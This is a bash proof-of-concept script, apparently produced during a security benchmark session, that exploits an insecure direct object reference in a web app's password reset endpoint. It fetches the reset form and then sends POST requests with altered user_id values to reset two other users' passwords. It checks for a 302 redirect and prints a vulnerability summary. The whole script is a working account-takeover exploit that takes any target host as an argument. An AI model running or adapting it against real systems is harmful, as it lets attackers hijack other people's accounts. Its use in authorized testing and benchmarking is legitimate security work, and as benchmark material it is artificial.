#!/bin/bash
# POC: IDOR vulnerability on password reset endpoint - demonstrates unauthorized password reset for arbitrary users via user_id parameter manipulation
# Target: ./repo
# Created: 2025-11-04T14:46:29.440Z
# Session: benchmark-XBEN-027-24-mhknopkv

# IDOR Password Reset Vulnerability POC
# Demonstrates unauthorized password reset for arbitrary users
# by modifying the user_id parameter in POST request

TARGET_HOST="${1:-localhost:8080}"
AUTHENTICATED_USER="test"
AUTHENTICATED_PASS="test"

echo "[*] IDOR Password Reset Vulnerability POC"
echo "[*] Target: $TARGET_HOST"
echo ""

# Step 1: Access password reset form to get hidden fields
echo "[+] Step 1: Accessing password reset form for authenticated user ($AUTHENTICATED_USER)"
FORM_RESPONSE=$(curl -s "http://$TARGET_HOST/password/$AUTHENTICATED_USER")
echo "[*] Form response:"
echo "$FORM_RESPONSE" | grep -E 'username|user_id|Welcome|method|action'
echo ""

# Extract current user info from form
CURRENT_USER_ID=$(echo "$FORM_RESPONSE" | grep -oP 'user_id["\s]*value["\s]*=["\s]*\K[0-9]+' | head -1)
echo "[*] Current authenticated user_id: $CURRENT_USER_ID"
echo ""

# Step 2: Exploit IDOR - modify password for a different user_id (10031)
echo "[+] Step 2: Attempting IDOR exploit - resetting password for user_id=10031"
EXPLOIT_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "http://$TARGET_HOST/password/$AUTHENTICATED_USER" \
  -d "username=$AUTHENTICATED_USER&user_id=10031&password=$AUTHENTICATED_PASS")

HTTP_CODE=$(echo "$EXPLOIT_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY=$(echo "$EXPLOIT_RESPONSE" | grep -v "HTTP_CODE:")

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Headers/Body:"
echo "$RESPONSE_BODY"
echo ""

# Check if exploit was successful (302 redirect indicates success)
if [ "$HTTP_CODE" = "302" ]; then
  echo "[✓] EXPLOIT SUCCESSFUL - HTTP 302 redirect received"
  echo "[✓] Password for user_id=10031 was successfully reset"
  echo "[✓] IDOR vulnerability confirmed - arbitrary user password changed"
else
  echo "[!] Response code: $HTTP_CODE (expected 302)"
fi
echo ""

# Step 3: Further exploitation with another arbitrary user_id (10050)
echo "[+] Step 3: Further exploitation - resetting password for user_id=10050"
EXPLOIT_RESPONSE_2=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "http://$TARGET_HOST/password/$AUTHENTICATED_USER" \
  -d "username=$AUTHENTICATED_USER&user_id=10050&password=$AUTHENTICATED_PASS")

HTTP_CODE_2=$(echo "$EXPLOIT_RESPONSE_2" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY_2=$(echo "$EXPLOIT_RESPONSE_2" | grep -v "HTTP_CODE:")

echo "[*] HTTP Response Code: $HTTP_CODE_2"
echo "[*] Response Headers/Body:"
echo "$RESPONSE_BODY_2"
echo ""

if [ "$HTTP_CODE_2" = "302" ]; then
  echo "[✓] EXPLOIT SUCCESSFUL - HTTP 302 redirect received"
  echo "[✓] Password for user_id=10050 was successfully reset"
  echo "[✓] Multiple arbitrary users can have their passwords reset"
else
  echo "[!] Response code: $HTTP_CODE_2 (expected 302)"
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
echo "The password reset endpoint is vulnerable to IDOR attacks."
echo "An authenticated attacker can reset passwords for arbitrary users"
echo "by modifying the user_id parameter in the POST request."
echo "This bypasses the server-side user ownership validation."
echo "=========================================="